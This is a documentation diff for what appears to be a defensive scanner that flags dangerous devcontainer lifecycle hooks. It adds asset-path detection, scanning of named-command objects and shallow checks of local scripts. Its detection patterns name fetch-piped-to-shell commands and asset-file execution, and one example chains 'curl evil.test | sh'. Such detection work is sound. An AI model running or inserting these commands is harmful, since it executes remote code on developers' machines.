@@ -118,7 +118,9 @@ Flags:
   pipes a network fetch into a shell (`curl … | sh`, `wget … | bash`,
   `Invoke-WebRequest … | iex`)
 * hooks that execute a **binary/asset path** rather than a manifest
-  (`node ./public/fonts/x.woff2`, `sh ./dist/setup.js`, `node ./tools/x.js`)
+  (`node ./public/fonts/x.woff2`, `sh ./dist/setup.js`, `node ./tools/x.js`).
+  A `./` prefix is **not** required: `node dist/setup.js`,
+  `node public/fonts/x.js`, `node assets/bootstrap.mjs` are flagged too.
 * `remoteUser`/`containerUser: root` **combined with** any exec hook
   (root alone is not flagged — a root-only devcontainer passes)
 
@@ -134,8 +136,13 @@ only suppresses the "unfamiliar command" noise for known-good single
 commands.
 
 Hook value forms accepted per the devcontainer spec: **string**, **array**
-(each element scanned individually), and **object** with a `"command"` key
-(string or array).
+(each element scanned individually; arrays execute directly via `exec`, so
+`argv[0]`+`argv[1]` are also recombined for asset-path detection), and
+**object** — a named-command object. The devcontainer CLI accepts named
+commands under *any* property key (e.g. `"command"`, `"setup"`, …), so every
+string/array value in the object is normalized and scanned; a `"command"` key
+does not hide a dangerous sibling. Empty objects and non-string values fail
+loud with a diagnostic rather than silently passing.
 
 ### Known false positives
 
@@ -189,6 +196,13 @@ an allow-listed command, so `husky install && curl evil.test | sh` is
 flagged. The allow-list only suppresses noise for known-good single
 commands.
 
+`node <path>.js` invocations are additionally resolved and the referenced
+local script is scanned for the same danger patterns (network fetch,
+`eval(`/`atob(`, base64 blobs, asset-path execution). The allow-listed
+spelling of a local script is not by itself a safety claim. This is **not** a
+JavaScript malware detector — it catches the same shapes the lifecycle-command
+scan catches, not arbitrary malicious logic.
+
 ### Known false positives
 
 None known for the documented allow-list. Unfamiliar-but-benign commands
@@ -203,6 +217,10 @@ narrow a danger pattern, not to widen an allow-list.
 * Pattern-based; not a semantic shell interpreter. An obfuscated payload
   that avoids every pattern below will pass (for example a payload built
   via shell command substitution rather than `eval(`).
+* The local-script content check (item 5) is shallow: it scans only the
+  same danger patterns used for the lifecycle command itself. It does not
+  statically analyze JavaScript semantics, resolve `require`/`import`
+  chains, or evaluate conditional execution.
 
 ## Tests
 
